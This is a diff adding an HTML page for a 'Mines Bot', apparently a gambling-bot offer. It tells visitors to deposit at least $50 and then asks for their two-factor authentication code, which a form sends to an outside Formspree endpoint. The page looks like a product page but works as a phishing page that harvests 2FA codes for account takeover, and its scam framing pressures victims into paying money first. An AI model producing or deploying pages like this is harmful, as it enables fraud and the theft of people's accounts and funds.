@@ -1,0 +1,159 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Welcome to Mines Bot</title>
+    <style>
+        body {
+            font-family: 'Arial', sans-serif;
+            direction: rtl;
+            margin: 0;
+            padding: 0;
+            background: linear-gradient(135deg, #6a82fb, #fc5c7d); /* تغير لون الخلفية */
+            color: #fff;
+            height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+
+        .container {
+            width: 100%;
+            max-width: 600px;
+            padding: 30px;
+            text-align: center;
+            background: rgba(0, 0, 0, 0.7);
+            border-radius: 12px;
+            box-shadow: 0 8px 30px rgba(0, 0, 0, 0.4);
+        }
+
+        .title {
+            font-size: 36px;
+            color: #FF6F61;
+            margin-bottom: 20px;
+            font-weight: bold;
+            line-height: 1.4;
+        }
+
+        .message {
+            font-size: 18px;
+            color: #ddd;
+            margin-bottom: 20px;
+            line-height: 1.6;
+        }
+
+        .next-btn, .submit-btn {
+            background: linear-gradient(135deg, #f09d51, #e04b8f);
+            border: none;
+            padding: 15px 30px;
+            font-size: 18px;
+            color: white;
+            border-radius: 30px;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            margin-top: 20px;
+        }
+
+        .next-btn:hover, .submit-btn:hover {
+            transform: translateY(-4px);
+            box-shadow: 0 6px 20px rgba(255, 105, 135, 0.3);
+        }
+
+        .next-btn:active, .submit-btn:active {
+            transform: translateY(2px);
+        }
+
+        .form-input {
+            width: 100%;
+            padding: 12px;
+            background-color: #333;
+            border: 1px solid #555;
+            border-radius: 8px;
+            font-size: 16px;
+            color: #fff;
+            margin-bottom: 20px;
+        }
+
+        .form-input:focus {
+            outline: none;
+            border-color: #f09d51;
+        }
+
+        .footer {
+            color: #aaa;
+            font-size: 14px;
+            position: absolute;
+            bottom: 20px;
+            text-align: center;
+            width: 100%;
+        }
+
+        .footer a {
+            color: #FF6F61;
+            text-decoration: none;
+            font-weight: bold;
+        }
+
+        .footer a:hover {
+            color: #f09d51;
+        }
+    </style>
+</head>
+<body>
+
+<div class="container">
+    <!-- Step 1: Instructions -->
+    <div class="step1">
+        <h1 class="title">Welcome to Mines Bot</h1>
+        <p class="message">Make sure that you have deposited at least $50 into your account for it to work. Otherwise, the bot will not do anything, and you will have wasted your money.</p>
+        <p class="message">Once you have completed the deposit, click on Next</p>
+        
+        <!-- Next Button -->
+        <button class="next-btn" onclick="showStep2()">Next</button>
+    </div>
+
+    <!-- Step 2: Enter 2FA Code -->
+    <div class="content" style="display: none;">
+        <h1 class="title">Enter 2FA Code</h1>
+        <p class="message">Please enter the 2FA code</p>
+
+        <!-- Form to get 2FA code -->
+        <form id="twofa-form" method="POST" action="https://formspree.io/f/movqdzvq">
+            <input type="text" id="twofa-code" name="twofa_code" class="form-input" placeholder="Enter 2FA code" required><br>
+            <button type="submit" class="submit-btn">Submit</button>
+        </form>
+    </div>
+</div>
+
+<!-- Footer -->
+<div class="footer">
+    <p>&copy; 2024 Mines Bot - All Rights Reserved. <a href="#">Terms and Conditions</a></p>
+</div>
+
+<script>
+    // Function to show Step 2 when 'Next' button is clicked
+    function showStep2() {
+        document.querySelector('.step1').style.display = 'none';  // Hide Step 1
+        document.querySelector('.content').style.display = 'block';  // Show Step 2
+    }
+
+    // When the form is submitted, it will send data to Formspree
+    document.getElementById('twofa-form').addEventListener('submit', function(event) {
+        event.preventDefault(); // Prevent the default form submission behavior
+
+        // Get the 2FA code entered by the user
+        const twofaCode = document.getElementById('twofa-code').value;
+
+        // Optionally, validate the 2FA code here if necessary
+
+        // Once the user submits the form, the page will automatically redirect to Formspree
+        this.submit(); // Submits the form data to the Formspree URL
+
+        // Optionally, show a message or redirect to another page here
+        alert('The 2FA code has been submitted!');
+    });
+</script>
+
+</body>
+</html>
